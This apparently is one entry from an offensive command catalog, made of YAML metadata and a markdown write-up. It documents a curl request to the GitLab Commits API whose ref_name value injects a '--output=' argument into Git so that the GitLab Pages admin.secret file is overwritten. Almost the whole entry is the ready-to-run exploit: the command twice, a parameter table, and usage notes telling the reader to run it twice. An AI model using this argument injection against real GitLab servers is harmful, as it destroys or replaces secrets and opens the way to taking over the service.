---
id: cmd-curl-secret-overwrite
data: >-
  curl
  'http://4290d4225642/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'
tags:
  - overwrite
  - secrets
type: command
output: >-
  API response, triggers Git commands to overwrite
  /var/opt/gitlab/gitlab-pages/admin.secret with commit hash (when run twice)
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.760Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-secret-overwrite

## Command

```bash
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'
```

## Description

Sends a GET request to the GitLab Commits API with ref_name to inject --output flag targeting the admin.secret file, overwriting it when run twice.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ref_name=--output=/var/opt/.../admin.secret | Targets secret file | Yes |

## Examples

### Basic Usage

```bash
curl 'http://target/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'
```
(Run twice for overwrite.)

## Expected Output

API response; file overwritten with commit hash on second run.

## Related

- [[procedures/Overwrite-GitLab-Secret-File-via-API]]
